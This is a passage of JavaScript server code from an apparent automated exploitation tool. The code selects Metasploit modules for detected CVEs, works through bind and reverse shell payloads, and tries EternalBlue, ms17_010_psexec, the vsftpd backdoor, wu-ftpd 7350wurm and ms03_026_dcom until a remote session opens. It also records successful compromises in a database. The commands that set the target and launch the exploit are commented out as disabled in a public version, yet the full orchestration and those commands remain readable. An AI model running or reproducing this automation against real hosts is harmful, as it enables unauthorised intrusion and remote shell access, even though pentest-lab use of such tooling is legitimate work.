  if (modulePath.includes("/windows/")) return "windows/x64/meterpreter/bind_tcp";
  // unix/ and multi/ modules work well with a lightweight cmd bind
  if (modulePath.startsWith("exploit/unix/") || modulePath.startsWith("exploit/multi/"))
    return "cmd/unix/bind_perl";
  return "linux/x64/meterpreter/bind_tcp";
}

// Return the correct RPORT for a module.
// For SMB/FTP/RDP/SSH the port is always fixed — ignore whatever port nmap
// happened to report the CVE on (e.g. nmap may tag an SMB CVE while scanning
// port 8080, but ms17_010/ms08_067 must always connect to port 445).
function resolveRport(modulePath, nmapPort) {
  if (/\/smb\//i.test(modulePath))    return 445;
  if (/\/ftp\//i.test(modulePath))    return 21;
  if (/\/rdp\//i.test(modulePath))    return 3389;
  if (/\/ssh\//i.test(modulePath))    return 22;
  if (/\/telnet\//i.test(modulePath)) return 23;
  if (/\/vnc\//i.test(modulePath))    return 5900;
  return nmapPort;  // null → let the module use its own default
}

// Ordered list of bind payloads to try for a given module.
// The preferred payload (from static map or guessPayload) goes first.
function getPayloadList(modulePath, preferredPayload) {
  // null = module is self-contained (e.g. vsftpd opens its own bind port)
  if (preferredPayload === null) return [null];

  // EternalBlue on Win10 often has bind_tcp blocked by Windows Firewall.
  // reverse_tcp bypasses it (target connects out). Try reverse first for eternalblue.
  const isEternalblue = /ms17_010_eternalblue/i.test(modulePath);

  const winPayloads = isEternalblue ? [
    "windows/x64/meterpreter/bind_tcp",    // bind — demostrado funcional en Win10 10240
    "windows/x64/shell/bind_tcp",
    "windows/x64/meterpreter/reverse_tcp", // reverse — fallback (requiere routing VPN correcto)
    "windows/x64/shell/reverse_tcp",
  ] : [
    "windows/x64/meterpreter/bind_tcp",
    "windows/meterpreter/bind_tcp",        // x86 — 32-bit targets (IIS 6, XP, 2003)
    "windows/x64/shell/bind_tcp",
    "windows/shell/bind_tcp",              // x86
    "windows/x64/meterpreter/reverse_tcp", // reverse — útil si bind bloqueado
    "windows/x64/shell/reverse_tcp",
    "windows/x64/meterpreter_bind_tcp",    // stageless x64
    "windows/meterpreter_bind_tcp",        // stageless x86
  ];

  // unix/ and multi/ modules tend to need lightweight cmd payloads first
  const unixPayloads = [
    "cmd/unix/bind_perl",
    "cmd/unix/bind_bash",
    "cmd/unix/bind_netcat",
    "linux/x86/shell_bind_tcp",           // stageless — works on old kernels (e.g. Red Hat 9)
    "linux/x64/shell_bind_tcp",           // stageless x64
    "linux/x64/meterpreter/bind_tcp",
    "linux/x86/meterpreter/bind_tcp",
    "linux/x64/shell/bind_tcp",
    "linux/x86/shell/bind_tcp",
  ];

  const linuxPayloads = [
    "linux/x64/meterpreter/bind_tcp",
    "linux/x86/meterpreter/bind_tcp",
    "linux/x86/shell_bind_tcp",           // stageless — works on old kernels (e.g. Red Hat 9)
    "linux/x64/shell_bind_tcp",           // stageless x64
    "linux/x64/shell/bind_tcp",
    "linux/x86/shell/bind_tcp",
    "cmd/unix/bind_perl",
    "cmd/unix/bind_bash",
    "linux/x64/meterpreter_bind_tcp",     // stageless
    "linux/x86/meterpreter_bind_tcp",     // stageless x86
  ];

  // Always try native payloads first, then the other OS — MSF rejects incompatible ones instantly
  let base;
  if (modulePath.includes("/windows/")) {
    base = [...winPayloads];
  } else if (modulePath.startsWith("exploit/unix/")) {
    base = [...unixPayloads, ...linuxPayloads];
  } else if (modulePath.startsWith("exploit/multi/")) {
    base = [...unixPayloads, ...linuxPayloads, ...winPayloads];
  } else {
    base = [...linuxPayloads, ...unixPayloads];
  }

  // Promote the preferred payload to the front (deduplicated)
  if (preferredPayload && base[0] !== preferredPayload) {
    base = [preferredPayload, ...base.filter((p) => p !== preferredPayload)];
  }

  return base;
}

// Find the best Metasploit module for a CVE.
// Checks static map first; falls back to live `search` in msfconsole.
async function findMsfModule(cve) {
  if (CVE_MODULES[cve] !== undefined) {
    if (!CVE_MODULES[cve].module) return null; // explicitly no module (Windows-only, etc.)
    return CVE_MODULES[cve];
  }

  const cveNum = cve.replace(/^CVE-/i, "");
  const { output, timedOut } = await msfRun([`search cve:${cveNum}`], 30000);
  if (timedOut) return null;

  // msfconsole output is full of ANSI codes — strip them before parsing
  const clean = stripAnsi(output);

  // Collect all module paths from the ranked table:
  //    0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  No  ...
  const rowRe = /^\s*\d+\s+((?:exploit|auxiliary)\/\S+)/gm;
  const rows = [];
  let m;
  while ((m = rowRe.exec(clean)) !== null) rows.push(m[1]);

  if (rows.length === 0) return null;

  // Prefer exploit/ modules over auxiliary/ ones (exploit modules open sessions)
  const best = rows.find((r) => r.startsWith("exploit/")) ?? rows[0];
  return { module: best, payload: guessPayload(best) };
}

// Detect our local IP for LHOST.
// Priority: tun*/vpn* (VPN) > 10.x > 172.x > 192.168.x > fallback
function getLhost(targetIp) {
  const ifaces = os.networkInterfaces();
  const entries = Object.entries(ifaces);

  // If target is on 10.0.x.x, prefer the tun/tap interface on 10.0.x.x
  if (targetIp) {
    const targetPrefix = targetIp.split(".").slice(0, 2).join(".");
    // First try: tun/tap/vpn interface matching the same /16 as the target
    for (const [name, addrs] of entries)
      if (/^(tun|tap|vpn)/i.test(name))
        for (const a of addrs)
          if (a.family === "IPv4" && a.address.startsWith(targetPrefix + "."))
            return a.address;
    // Second try: any interface with same /16 prefix as target
    for (const [, addrs] of entries)
      for (const a of addrs)
        if (a.family === "IPv4" && !a.internal && a.address.startsWith(targetPrefix + "."))
          return a.address;
  }

  // Generic fallback priority: tun/tap first, then any private IP
  for (const [name, addrs] of entries)
    if (/^(tun|tap|vpn)/i.test(name))
      for (const a of addrs)
        if (a.family === "IPv4")
          return a.address;

  for (const [, addrs] of entries)
    for (const a of addrs)
      if (a.family === "IPv4" && !a.internal)
        return a.address;

  return "127.0.0.1";
}

// ── Persistent msfconsole process ─────────────────────────────────────────
// Uses a sentinel echo trick so we know exactly when a command's output ends.
let msfProc   = null;
let msfBuf    = "";
const msfQueue = []; // [{ sentinel, resolve, timer }]
let lportBase  = 4455;
let sessionCounter = 0;
const activeSessions = {}; // sessionId → { msfId, type, ip, cve }
const rawShells      = {}; // sessionId → { process, ip }

function msfOnData(chunk) {
  msfBuf += chunk.toString();
  while (msfQueue.length) {
    const { sentinel, resolve, timer } = msfQueue[0];
    const idx = msfBuf.indexOf(sentinel);
    if (idx === -1) break;
    const output = msfBuf.slice(0, idx);
    msfBuf = msfBuf.slice(idx + sentinel.length);
    msfQueue.shift();
    clearTimeout(timer);
    resolve(output);
  }
}

function ensureMsf() {
  if (msfProc && !msfProc.killed) return;
  console.log("[msf] Starting msfconsole...");
  msfProc = spawn("msfconsole", ["-q"], { stdio: ["pipe", "pipe", "pipe"] });
  msfProc.stdout.on("data", msfOnData);
  msfProc.stderr.on("data", () => {});
  msfProc.on("close", (code) => {
    console.log(`[msf] msfconsole exited (${code})`);
    msfProc = null;
    msfBuf  = "";
  });
}

function msfRun(commands, timeoutMs = 120000) {
  ensureMsf();
  const sentinel = `AUTOPWN_${Date.now()}_${Math.random().toString(36).slice(2)}`;
  return new Promise((resolve) => {
    const timer = setTimeout(() => {
      const i = msfQueue.findIndex((q) => q.sentinel === sentinel);
      if (i >= 0) msfQueue.splice(i, 1);
      const out = msfBuf;
      msfBuf = "";
      resolve({ output: out, timedOut: true });
    }, timeoutMs);

    msfQueue.push({
      sentinel,
      timer,
      resolve: (output) => resolve({ output, timedOut: false }),
    });

    msfProc.stdin.write([...commands, `echo ${sentinel}`].join("\n") + "\n");
  });
}

// ── Raw shell helpers (wu-ftpd / 7350wurm) ───────────────────────────────────

function rawExec(sessionId, cmd, timeout = 10000) {
  const rs = rawShells[sessionId];
  if (!rs || !rs.process) return Promise.resolve("[raw shell no disponible]");
  return new Promise((resolve) => {
    let output = "";
    let settled = false;
    let idleTimer;
    const settle = () => {
      if (settled) return;
      settled = true;
      rs.process.stdout.removeListener("data", onData);
      clearTimeout(idleTimer);
      resolve(output.trim());
    };
    const resetIdle = () => {
      clearTimeout(idleTimer);
      idleTimer = setTimeout(settle, 1500);
    };
    const onData = (chunk) => { output += chunk.toString(); resetIdle(); };
    rs.process.stdout.on("data", onData);
    setTimeout(settle, timeout);
    rs.process.stdin.write(cmd + "\n");
    resetIdle();
  });
}

async function tryFtpExploit(ip) {
  const log = [];
  const push = (l) => { log.push(l); console.log(`[ftp-exploit] ${l}`); };

  push("[*] Puerto 21 FTP abierto — estudiando versiones...");

  // Version check via nmap
  const nmapOut = await new Promise((resolve) => {
    const proc = spawn("nmap", ["-sV", "-p", "21", "--open", ip]);
    let out = "";
    proc.stdout.on("data", d => out += d.toString());
    proc.stderr.on("data", d => out += d.toString());
    proc.on("close", () => resolve(out));
    setTimeout(() => { proc.kill(); resolve(out); }, 30000);
  });

  push(`[*] Banner nmap: ${nmapOut.split("\n").find(l => /21\/tcp/.test(l))?.trim() ?? "no detectado"}`);

  if (!nmapOut.includes("wu-2.6.1-16")) {
    push("[-] Versión wu-2.6.1-16 no detectada — saltando exploit FTP");
    return { log: log.join("\n"), sessionId: null };
  }

  push("[+] Versión wu-ftpd 2.6.1-16 confirmada");

  // --- Compilación y lanzamiento del exploit deshabilitados en esta versión pública ---
  // El exploit original (7350wurm / 348.c, TESO Security) tiene licencia restrictiva
  // de redistribución y no se incluye ni se ejecuta desde este repositorio. En la
  // versión completa, esta función compilaba 348.c (obtenido de ExploitDB) y lo
  // lanzaba contra el objetivo para obtener una shell root:
  //
  //   const exploitSrc = "/usr/share/exploitdb/exploits/linux/remote/348.c";
  //   const binPath    = path.join(__dirname, "7350wurm");
  //   // gcc -o 7350wurm 348.c
  //   // ./7350wurm -t 19 -d <ip> -p anything@mail.com
  //
  push("[-] Lanzamiento del exploit deshabilitado en esta versión pública");
  return { log: log.join("\n"), sessionId: null };
}

// Module path prefixes that can NEVER open a shell session — skip them in exploit loop
const NON_SESSION_PREFIXES = [
  "auxiliary/scanner/",
  "auxiliary/dos/",
  "auxiliary/gather/",
  "auxiliary/analyze/",
  "auxiliary/fuzz/",
  "auxiliary/admin/",
  "auxiliary/spoof/",
  "auxiliary/server/",
  "post/",
];
function canOpenSession(modulePath) {
  return !NON_SESSION_PREFIXES.some((p) => modulePath.startsWith(p));
}

// POST /exploit — tries each CVE in order until a session opens
app.post("/exploit", async (req, res) => {
  const { ip, vulns = [], cve: singleCve, port: singlePort, jobId, maxAttempts = null } = req.body;
  if (!ip) return res.status(400).json({ error: "Falta el parámetro 'ip'" });

  // Accept both { vulns: [{cve,port},...] } and legacy { cve, port }
  const raw = vulns.length > 0
    ? vulns
    : singleCve ? [{ cve: singleCve, port: singlePort }] : [];

  // Expand companion CVEs: MS17-010 family — if any member detected, try all three
  const MS17010_FAMILY = [
    { cve: "CVE-2017-0143", severity: "critical" },
    { cve: "CVE-2017-0144", severity: "critical" },
    { cve: "CVE-2017-0145", severity: "critical" },
  ];
  const expanded = [...raw];
  if (raw.some(({ cve }) => MS17010_FAMILY.some(f => f.cve === cve))) {
    const port445 = raw.find(({ cve }) => MS17010_FAMILY.some(f => f.cve === cve))?.port ?? 445;
    for (const { cve, severity } of MS17010_FAMILY) {
      if (!expanded.some(e => e.cve === cve))
        expanded.push({ cve, port: port445, severity });
    }
  }

  // Deduplicate by CVE, then sort: by port ascending (null ports last), then by severity
  // This matches the display order shown by find-vulns in the UI.
  const SEVERITY_ORDER = { critical: 0, high: 1, medium: 2, low: 3 };
  const seen = new Set();
  const toTry = expanded
    .filter(({ cve }) => {
      if (seen.has(cve)) return false;
      seen.add(cve);
      return true;
    })
    .sort((a, b) => {
      const pa = a.port != null ? Number(a.port) : 99999;
      const pb = b.port != null ? Number(b.port) : 99999;
      if (pa !== pb) return pa - pb;
      const sa = SEVERITY_ORDER[a.severity?.toLowerCase()] ?? 4;
      const sb = SEVERITY_ORDER[b.severity?.toLowerCase()] ?? 4;
      return sa - sb;
    });

  if (toTry.length === 0)
    return res.json({ success: false, output: "[!] No hay CVEs para intentar" });

  const t0Exploit = Date.now(); // timer desde que el usuario pulsa Exploit

  // ── Rama FTP: wu-ftpd 2.6.1-16 ───────────────────────────────────────────
  if (toTry.some(v => Number(v.port) === 21) || vulns.some(v => Number(v.port) === 21)) {
    const ftpRes = await tryFtpExploit(ip);
    const ftpDurationMs = Date.now() - t0Exploit;
    if (ftpRes.sessionId) {
      // Save to DB — same as main exploit loop
      if (jobId) {
        try {
          const [[row]] = await db.execute("SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?", [jobId, ip]);
          if (row) {
            const [attResult] = await db.execute(
              "INSERT INTO exploit_attempt (jobs_id, host_id, port, success, duration_ms, output, state) VALUES (?, ?, 21, 1, ?, ?, 'done')",
              [jobId, row.id, ftpDurationMs, "module: wu-ftpd 2.6.1-16 / 7350wurm | result: Shell root obtenida"]
            );
            const [sessResult] = await db.execute(
              "INSERT INTO exploit_session (jobs_id, host_id, type, method, cve, state) VALUES (?, ?, 'shell', 'exploit', 'CVE-2000-0573', 'done')",
              [jobId, row.id]
            );
            await logActivity(jobId, "exploit_success", attResult.insertId, "exploit_attempt",
              { ip, module: "wu-ftpd 2.6.1-16 / 7350wurm", cve: "CVE-2000-0573", port: 21 },
              { observaciones: "Shell root obtenida via wu-ftpd 7350wurm" }
            );
            await logActivity(jobId, "session_opened", sessResult.insertId, "exploit_session",
              { ip, type: "shell", cve: "CVE-2000-0573", module: "wu-ftpd 2.6.1-16 / 7350wurm" },
              { duration_ms: ftpDurationMs, observaciones: `Sesión shell abierta en ${ip} via wu-ftpd 7350wurm — tiempo: ${ftpDurationMs}ms` }
            );
          }
        } catch (e) { console.error("[ftp-exploit] DB insert error:", e.message); }
      }
      return res.json({
        success: true,
        sessionId: ftpRes.sessionId,
        output: ftpRes.log,
        exploitModule: "wu-ftpd 2.6.1-16 / 7350wurm",
        exploitOptions: ftpRes.startupOut,
      });
    }
    // FTP failed — continue with MSF flow
  }

  // Kill any leftover background jobs from previous exploit runs.
  // Without this, msfconsole can be saturated with pending threads (from prior
  // run -j calls) and take 100+ seconds to process new commands.
  await msfRun(["jobs -K"], 15000);
  await new Promise((r) => setTimeout(r, 2000)); // give msfconsole time to clean up

  let fullLog  = "";
  let hostRow  = null;
  let intentos = 0;
  const t0Total = t0Exploit; // timer global — ya iniciado antes de la rama FTP
  if (jobId) {
    try {
      const [[row]] = await db.execute("SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?", [jobId, ip]);
      hostRow = row ?? null;
    } catch (e) { console.error("[exploit] DB lookup error:", e.message); }
  }

  for (const { cve, port } of toTry) {
    if (maxAttempts && intentos >= maxAttempts) break;
    fullLog += `\n[*] Buscando módulo para ${cve}...\n`;
    const mod = await findMsfModule(cve);
    if (!mod) {
      fullLog += `[!] No se encontró módulo en Metasploit para ${cve} — saltando\n`;
      continue;
    }

    // Skip scanner/DOS/gather modules — they can never open a session
    if (!canOpenSession(mod.module)) {
      fullLog += `[*] ${mod.module} es un módulo de reconocimiento — saltando\n`;
      continue;
    }

    fullLog += `[+] Módulo: ${mod.module}\n`;

    const payloads  = getPayloadList(mod.module, mod.payload);
    const ipEscaped = ip.replace(/\./g, "\\.");
    const isSmbModule = /\/smb\//i.test(mod.module);
    // SMB: try 445 first, then fall back to 139 (NetBIOS — used by Windows 2003/XP when 445 is blocked)
    // EternalBlue only works on port 445 (kernel exploit, not SMB auth like psexec)
    const isEternalblueModule = /ms17_010_eternalblue/i.test(mod.module);
    const rportCandidates = isEternalblueModule ? [445] : isSmbModule ? [445, 139] : [resolveRport(mod.module, port)];
    // Modules with multiple TARGETURI candidates (e.g. Shellshock needs a real CGI script path)
    const uriCandidates = mod.uris ?? [null];

    let moduleSucceeded = false;
    for (const rport of rportCandidates) {
      if (moduleSucceeded) break;
      if (maxAttempts && intentos >= maxAttempts) break;
      if (rportCandidates.length > 1) fullLog += `[*] Intentando SMB en puerto ${rport}...\n`;

    for (const targetUri of uriCandidates) {
      if (moduleSucceeded) break;
      if (maxAttempts && intentos >= maxAttempts) break;
      if (targetUri) fullLog += `[*] Probando TARGETURI ${targetUri}...\n`;

    for (const payload of payloads) {
      const isBind = !payload || payload.includes("bind");
      const lhost  = getLhost(ip);
      const lport  = lportBase++;

      // vsftpd_234_backdoor only supports cmd/unix/interact which dies with run -j
      // (no TTY in background mode). Use foreground run + background command instead:
      // the interact loop reads "background" from stdin and properly suspends the session,
      // keeping the TCP connection to port 6200 alive and the session in sessions list.
      const isInteractOnly = !payload && /vsftpd/i.test(mod.module);

      // EternalBlue needs SMBUser/SMBPass (even empty) to reach NT Trans / nonpaged pool phase
      const needsSmbCreds = /ms17_010_eternalblue/i.test(mod.module);

      const cmds = [
        `use ${mod.module}`,
        // --- Configuración y lanzamiento del exploit deshabilitados en esta versión pública ---
        // `set RHOSTS ${ip}`,
        // rport ? `set RPORT ${rport}` : null,
        // targetUri ? `set TARGETURI ${targetUri}` : null,
        // needsSmbCreds ? "set SMBUser Administrator" : null,
        // needsSmbCreds ? "set SMBPass ''"           : null,
        // !isBind ? `set LHOST ${lhost}` : null,
        // payload ? `set LPORT ${lport}` : null,
        // payload ? `set PAYLOAD ${payload}` : null,
        // isInteractOnly ? "run" : "run -j",
        // isInteractOnly ? "background" : null,
      ].filter(Boolean);

      if (maxAttempts && intentos >= maxAttempts) {
        fullLog += `[!] Límite de ${maxAttempts} intentos alcanzado — abortando\n`;
        break;
      }
      intentos++;
      const t0attempt = Date.now();
      fullLog += `[*] Payload: ${payload ?? "(self-contained)"}\n`;
      console.log(`[exploit] Trying ${cve} → ${mod.module} payload=${payload} on ${ip}:${rport ?? "default"}`);

      // Snapshot de sesiones activas ANTES del intento para detectar solo sesiones nuevas
      const { output: preSess } = await msfRun(["sessions -l"], 8000);
      const existingIds = new Set(
        [...joinSessionLines(stripAnsi(preSess)).matchAll(/^\s*(\d+)\s+/gm)].map(m => m[1])
      );

      const { output: runOut } = await msfRun(cmds, 300000);
      fullLog += runOut;

      // If msfconsole instantly rejected the payload as incompatible, skip the 8 s wait
      if (/not a compatible payload|value specified for PAYLOAD is not valid/i.test(stripAnsi(runOut))) {
        fullLog += `\n[-] Payload ${payload ?? "self-contained"} no es compatible — saltando\n`;
        continue;
      }

      // Self-contained modules (e.g. vsftpd backdoor) connect to a backdoor port
      // which can take 20-40s. Check sessions at 15s and again at 45s.
      // Exception: vsftpd with run+background — session is already created when msfRun returns.
      let sessOut = "";
      const isEternalblue = /ms17_010_eternalblue/i.test(mod.module);
      if (isInteractOnly) {
        // Session is already backgrounded — check immediately, brief wait only for msf bookkeeping
        await new Promise((r) => setTimeout(r, 2000));
        const { output: s } = await msfRun(["sessions -l"], 15000);
        sessOut = s;
        fullLog += "\n" + sessOut;
      } else if (!payload) {
        await new Promise((r) => setTimeout(r, 15000));
        const { output: early } = await msfRun(["sessions -l"], 15000);
        sessOut = early;
        fullLog += "\n" + sessOut;
        // If no session yet, wait another 30s and check again
        if (!/meterpreter|shell/i.test(stripAnsi(early))) {
          await new Promise((r) => setTimeout(r, 30000));
          const { output: late } = await msfRun(["sessions -l"], 15000);
          sessOut = late;
          fullLog += "\n[*] Recheck sessions after extended wait:\n" + sessOut;
        }
      } else {
        // EternalBlue needs more time to negotiate the kernel shellcode
        await new Promise((r) => setTimeout(r, isEternalblue ? 25000 : 8000));
        const { output: s } = await msfRun(["sessions -l"], 15000);
        sessOut = s;
        fullLog += "\n" + sessOut;
      }

      // ms17_010_psexec fails on Win10 when no named pipe is accessible → switch to eternalblue
      if (/unable to find accessible named pipe/i.test(stripAnsi(runOut + "\n" + sessOut)) &&
          /ms17_010_psexec/i.test(mod.module)) {
        fullLog += `\n[*] Named pipe no accesible — CVE-2017-0144 (eternalblue) se intentará a continuación\n`;
        break;
      }

      const combined = runOut + "\n" + sessOut;
      const isLocalModule = /\/local\//i.test(mod.module);
      const sessionOpened = isLocalModule
        ? /session \d+ (opened|created)|meterpreter session \d+|command shell session \d+|found shell|\[\+\] session \d+/i.test(combined)
        : new RegExp(
            `(?:session \\d+ opened|meterpreter session \\d+ opened|command shell session \\d+ opened|found shell)[^\\n]*${ipEscaped}`, "i"
          ).test(combined);
      // For local modules: any active session in sessions -l counts (IP may not appear)
      // Take the LAST match (highest session ID = most recently opened) to avoid picking
      // stale/dead sessions from previous runs that still appear in sessions -l.
      const joinedSessOut = joinSessionLines(stripAnsi(sessOut));
      const sessMatches = [...joinedSessOut.matchAll(
        isLocalModule
          ? /^\s*(\d+)\s+\S*\s*(meterpreter|shell)\b/gmi
          : new RegExp(`^\\s*(\\d+)\\s+.*?\\b(meterpreter|shell)\\b.*${ipEscaped}`, "gmi")
      )].filter(m => !existingIds.has(m[1])); // solo sesiones nuevas, no preexistentes
      const sessRow = sessMatches.at(-1) ?? null;

      // For local modules: if regex didn't match, do a final sessions -l check
      let localSessRow = null;
      if (isLocalModule && !sessionOpened && !sessRow) {
        const { output: localSess } = await msfRun(["sessions -l"], 10000);
        sessOut += "\n" + localSess;
        fullLog += "\n" + localSess;
        const localSessMatches = [...joinSessionLines(stripAnsi(localSess)).matchAll(/^\s*(\d+)\s+\S*\s*(meterpreter|shell)\b/gmi)];
        localSessRow = localSessMatches.at(-1) ?? null;
      }

      if (sessionOpened || sessRow || localSessRow) {
        const activeRow = sessRow ?? localSessRow;
        // Prefer sessions -l row; fall back to extracting ID from run output text;
        // last resort: "1" (legacy behaviour, often wrong when MSF has prior sessions).
        const idFromText = combined.match(/(?:meterpreter|command shell|shell) session (\d+) (?:opened|created)/i);
        const msfId = activeRow ? activeRow[1] : (idFromText ? idFromText[1] : "1");
        const type  = activeRow ? activeRow[2] : "meterpreter";
        const sessionId = ++sessionCounter;
        activeSessions[sessionId] = { msfId, type, ip, cve };
        console.log(`[exploit] Session ${sessionId} opened via ${cve}/${payload} on ${ip} (msf id ${msfId})`);

        if (hostRow) {
          try {
            const [attResult] = await db.execute(
              "INSERT INTO exploit_attempt (jobs_id, host_id, port, success, duration_ms, output, state) VALUES (?, ?, ?, 1, ?, ?, 'done')",
              [jobId, hostRow.id, rport ?? null, Date.now() - t0attempt, `module: ${mod.module} | payload: ${payload ?? "self-contained"} | result: Session opened`]
            );
            const [sessResult] = await db.execute(
              "INSERT INTO exploit_session (jobs_id, host_id, type, method, cve, state) VALUES (?, ?, ?, 'exploit', ?, 'done')",
              [jobId, hostRow.id, type, cve]
            );
            await logActivity(jobId, "exploit_success", attResult.insertId, "exploit_attempt",
              { ip, module: mod.module, payload, cve, port: rport },
              { intentos, duration_ms: Date.now() - t0attempt, observaciones: `Sesión ${type} abierta via ${cve} con ${mod.module}` }
            );
            await logActivity(jobId, "session_opened", sessResult.insertId, "exploit_session",
              { ip, type, cve, module: mod.module, payload },
              { intentos, duration_ms: Date.now() - t0Total, observaciones: `Sesión ${type} abierta en ${ip} via ${cve} — tiempo total desde inicio del ataque: ${Date.now() - t0Total}ms` }
            );
          } catch (e) { console.error("[exploit] DB insert error:", e.message); }
        }

        const { output: optOut } = await msfRun(["show options"], 15000);
        return res.json({
          success: true, sessionId, output: fullLog,
          exploitModule: mod.module,
          exploitOptions: stripAnsi(optOut).trim(),
        });
      }

      if (hostRow) {
        try {
          const summary = msfSummary(combined, mod.module, payload);
          const [attResult] = await db.execute(
            "INSERT INTO exploit_attempt (jobs_id, host_id, port, success, duration_ms, output, state) VALUES (?, ?, ?, 0, ?, ?, 'done')",
            [jobId, hostRow.id, rport ?? null, Date.now() - t0attempt, summary]
          );
          await logActivity(jobId, "exploit_failed", attResult.insertId, "exploit_attempt",
            { ip, module: mod.module, payload, cve, port: rport },
            { intentos, duration_ms: Date.now() - t0attempt, observaciones: summary }
          );
        } catch (e) { console.error("[exploit] DB insert error:", e.message); }
      }

      const cleanCombined = stripAnsi(combined);

      // MS17-010 checker explicitly says not vulnerable — no payload will change this
      if (/The target is not vulnerable/i.test(cleanCombined)) {
        fullLog += `\n[-] El objetivo no es vulnerable según el checker — saltando módulo\n`;
        moduleSucceeded = true;
        break;
      }

      // Module-level failure: wrong target architecture — no payload will fix this
      if (/no-target:|only supports (x64|x86|32-bit|64-bit)/i.test(cleanCombined)) {
        fullLog += `\n[-] El módulo no es compatible con la arquitectura del objetivo — saltando\n`;
        moduleSucceeded = true; // use as "done" flag to break outer loop too
        break;
      }

      // SMB credential failure — STATUS_ACCESS_DENIED means the server rejected our login.
      // No payload change will fix this; the module needs valid credentials.
      if (/STATUS_ACCESS_DENIED/i.test(cleanCombined) && /LoginError|Login Failed/i.test(cleanCombined)) {
        fullLog += `\n[-] SMB login rechazado (STATUS_ACCESS_DENIED) — se necesitan credenciales válidas, saltando módulo\n`;
        moduleSucceeded = true;
        break;
      }

      // EternalBlue SMB1 kernel failure — STATUS_INVALID_PARAMETER on SMB1 session setup
      // means the target has SMB1 disabled (common on Server 2012 R2+). No payload fixes this.
      if (/STATUS_INVALID_PARAMETER/i.test(cleanCombined) && /session setup|nonpaged pool/i.test(cleanCombined)) {
        fullLog += `\n[-] EternalBlue falló: SMB1 deshabilitado en el objetivo (STATUS_INVALID_PARAMETER) — saltando módulo\n`;
        moduleSucceeded = true;
        break;
      }

      // vsftpd backdoor: if no session after run+background, either port 6200 is filtered
      // or the backdoor was not triggered (wrong vsftpd version / already patched).
      if (isInteractOnly) {
        fullLog += `\n[!] vsftpd backdoor: el exploit no abrió sesión.\n`;
        fullLog += `[!] Verifica que el puerto 6200 del objetivo sea alcanzable: nc -zv ${ip} 6200\n`;
        fullLog += `[!] Si el puerto 6200 ya estaba abierto de un intento anterior, reinicia vsftpd en el objetivo.\n`;
        break;
      }

      // Service is down on this port — try next port candidate if available
      if (/connection.*refused|ConnectionRefused/i.test(cleanCombined)) {
        fullLog += `\n[-] Puerto ${rport} no alcanzable — ${isSmbModule && rport === 445 ? "probando puerto 139..." : "saltando módulo"}\n`;
        break;
      }

      fullLog += `\n[-] Payload ${payload ?? "self-contained"} falló — probando siguiente payload...\n`;
    }
    } // end targetUri candidates loop
    } // end rport candidates loop


    fullLog += `\n[-] ${cve} — todos los payloads fallaron, probando siguiente CVE...\n`;
  }

  // ── Fallback SMB anónimo (ms17_010_psexec + anonymous + shell_bind_tcp:4455) ──
  // Some hosts (e.g. lab machines) reject the default empty credentials but accept
  // SMBUser=anonymous / SMBPass=''. Try this fixed config if SMB CVEs were in scope
  // and nothing else worked.
  const hasSmbCve = toTry.some(v => /445|139/.test(String(v.port)) || /ms17_010|smb/i.test(v.cve ?? ""));
  if (hasSmbCve) {
    fullLog += `\n[*] Intentando fallback SMB anónimo: ms17_010_psexec + anonymous + windows/x64/shell_bind_tcp:4455\n`;
    const fallbackCmds = [
      "use exploit/windows/smb/ms17_010_psexec",
      // --- Configuración y lanzamiento del exploit deshabilitados en esta versión pública ---
      // `set RHOSTS ${ip}`,
      // "set RPORT 445",
      // "set SMBUser anonymous",
      // "set SMBPass ''",
      // "set PAYLOAD windows/x64/shell_bind_tcp",
      // "set LPORT 4455",
      // "run -j",
    ];
    const { output: fbOut } = await msfRun(fallbackCmds, 300000);
    fullLog += fbOut;
    await new Promise((r) => setTimeout(r, 15000));
    const { output: fbSess } = await msfRun(["sessions -l"], 15000);
    fullLog += "\n" + fbSess;

    const fbJoined = joinSessionLines(stripAnsi(fbSess));
    const fbMatches = [...fbJoined.matchAll(
      new RegExp(`^\\s*(\\d+)\\s+.*?\\b(meterpreter|shell)\\b.*${ip.replace(/\./g, "\\.")}`, "gmi")
    )];
    const fbRow = fbMatches.at(-1) ?? null;
    const fbTextMatch = (fbOut + "\n" + fbSess).match(/(meterpreter|command shell|shell) session (\d+) (?:opened|created)/i);
    const fbMsfId = fbRow ? fbRow[1] : (fbTextMatch ? fbTextMatch[2] : null);

    if (fbRow || fbTextMatch) {
      const fbType    = fbRow ? fbRow[2] : "shell";
      const sessionId = ++sessionCounter;
      activeSessions[sessionId] = { msfId: fbMsfId, type: fbType, ip, cve: "CVE-2017-0145" };
      console.log(`[exploit] Session ${sessionId} opened via SMB-anon fallback on ${ip} (msf id ${fbMsfId})`);
      if (hostRow) {
        try {
          await db.execute(
            "INSERT INTO exploit_attempt (jobs_id, host_id, port, success, duration_ms, output, state) VALUES (?, ?, 445, 1, ?, ?, 'done')",
            [jobId, hostRow.id, Date.now() - t0Total, "module: exploit/windows/smb/ms17_010_psexec | payload: windows/x64/shell_bind_tcp | result: Session opened"]
          );
          const [sessResult] = await db.execute(
            "INSERT INTO exploit_session (jobs_id, host_id, type, method, cve, state) VALUES (?, ?, ?, 'exploit', 'CVE-2017-0145', 'done')",
            [jobId, hostRow.id, fbType]
          );
          await logActivity(jobId, "session_opened", sessResult.insertId, "exploit_session",
            { ip, type: fbType, cve: "CVE-2017-0145", module: "ms17_010_psexec", payload: "windows/x64/shell_bind_tcp" },
            { duration_ms: Date.now() - t0Total, observaciones: `Sesión abierta via fallback SMB anónimo en ${ip}` }
          );
        } catch (e) { console.error("[exploit] DB fallback error:", e.message); }
      }
      const { output: fbOpts } = await msfRun(["show options"], 15000);
      return res.json({ success: true, sessionId, output: fullLog, exploitModule: "exploit/windows/smb/ms17_010_psexec", exploitOptions: stripAnsi(fbOpts).trim() });
    }
    fullLog += `\n[-] Fallback SMB anónimo también falló.\n`;
  }

  // ── Fallback RPC/DCOM (ms03_026_dcom) — puerto 135 abierto pero CVE no detectado ──
  const hasRpcPort = toTry.some(v => Number(v.port) === 135) ||
                     vulns.some(v => Number(v.port) === 135);
  if (hasRpcPort) {
    fullLog += `\n[*] Intentando fallback RPC/DCOM: ms03_026_dcom + windows/shell/bind_tcp:4455\n`;
    const rpcCmds = [
      "use exploit/windows/dcerpc/ms03_026_dcom",
      // --- Configuración y lanzamiento del exploit deshabilitados en esta versión pública ---
      // `set RHOSTS ${ip}`,
      // "set RPORT 135",
